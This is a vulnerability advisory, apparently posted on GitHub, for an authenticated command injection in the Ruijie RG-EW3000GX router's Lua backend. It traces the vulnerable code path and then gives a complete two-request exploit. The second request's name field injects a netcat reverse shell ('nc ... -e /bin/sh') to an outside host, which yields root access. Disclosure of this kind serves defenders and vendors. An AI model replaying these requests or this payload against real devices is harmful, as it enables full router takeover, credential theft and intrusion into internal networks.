# Ruijie RG-EW3000GX

- Vendor：Ruijie
- Product：AX3000 Dual-Band Wi-Fi 6 Wireless Router
- Product Model：RG-EW3000GX
- Firmware Version：EW_3.0(1)B11P380,Release(12222219)
- Vulnerability Type：Authenticated Command Injection

# Description

uijie Reyee RG-EW3000GX router (firmware version EW_3.0(1)B11P380) has a command injection vulnerability in the `name` field of the `dev_config user_list_note` module in the backend service, with no security filtering or validation in place. Since the web management interface only requires a valid  admin session (sid) to access, any authenticated attacker can exploit  this vulnerability to execute arbitrary commands as root.

# Impact

An authenticated attacker can execute arbitrary commands with **root** privileges, leading to full compromise of the device (reading `/etc/rg_config/admin` ciphertext, dumping configs, installing persistent backdoors, pivoting into the internal network).



# Vulnerability Details

**usr/local/lua/dev_config/user_list_note.lua**

<img width="999" height="291" alt="图片" src="https://github.com/user-attachments/assets/7cc26ca8-031d-417e-96b0-2f8808239d6b" />


**Here, there are obvious characteristics of a command injection vulnerability. Next, the focus should be on examining `sync_list`, which is `child_data`, and then scroll back up to analyze `child_guard_packaged_data`.**

<img width="943" height="418" alt="图片" src="https://github.com/user-attachments/assets/533988b5-92a3-4223-a3e3-8e2fbe199eba" />


The logic here dictates that only when an identical MAC address exists will the data be stored into `child_data`, which is a prerequisite for reaching the `os.execute(cmd)` call inside `child_guard_sync`. This ultimately allows the attacker to exploit the controllable `name` parameter for command injection.

Therefore, the overall exploitation strategy is as follows:

1. First, register a child device MAC address through the router's legitimate parental control feature.
2. Then, use that same MAC address to trigger the vulnerable code path, with the `name` field carrying the injected payload.

The immediate next step is to determine **how to register a child MAC address** via the web interface or backend API.

```
gedit ./usr/local/lua/dev_config/child_guard.lua
```

**Request Entry Point**

<img width="1061" height="368" alt="图片" src="https://github.com/user-attachments/assets/9e098fe8-d18c-4fdb-8fdd-4f99d1bcfa1d" />


<img width="884" height="742" alt="图片" src="https://github.com/user-attachments/assets/e673536f-a1e7-423a-aa6a-bca827c9d5a1" />


<img width="998" height="553" alt="图片" src="https://github.com/user-attachments/assets/b114f048-43a9-432b-8e7d-ddc0be112939" />


The logic here indicates that:

- If the MAC address **already exists**, the operation is limited to **updating** the fields (such as `name`) of that existing record; duplicate registration is not allowed.
- If the MAC address **does not exist**, a new record is added via `table.insert`.
- Ultimately, the data is written to a **configuration file** for persistent storage.

This implies:

1. Registering a child MAC is a one-time operation — the MAC serves as the unique key.
2. Subsequent operations on the same MAC are restricted to **field modifications** (which is precisely where the injectable `name` parameter comes into play).
3. The path of the persistent configuration file should be noted, as it may be parsed or executed again upon subsequent reads.

<img width="1031" height="186" alt="图片" src="https://github.com/user-attachments/assets/781e5daa-90e5-471d-9eee-99a0f8e6c3a9" />


exp

**Register first.**

```http
POST /cgi-bin/luci/api/cmd?auth=7e8984442364476c5c114474e61a5e58  HTTP/1.1
Host: 10.44.77.254
Content-Length: 122
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Origin: http://10.44.77.254
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"method":"devConfig.add","params":{"module":"child_guard","data":{"guardUser":[{"mac":"aa:bb:cc:dd:ee:ff","name":"x"}]}}}
```

**Then exploit.**

```http
POST /cgi-bin/luci/api/cmd?auth=7e8984442364476c5c114474e61a5e58 HTTP/1.1
Host: 10.44.77.254
Content-Length: 157
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Origin: http://10.44.77.254
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"method":"devConfig.update","params":{"module":"user_list_note","data":{"list":[{"mac":"aa:bb:cc:dd:ee:ff","name":"x';nc 10.44.77.10 4444 -e /bin/sh;'"}]}}}
```
<img width="2485" height="1192" alt="图片" src="https://github.com/user-attachments/assets/ddaa2167-f9e8-45f7-8b76-51e07c365cc8" />










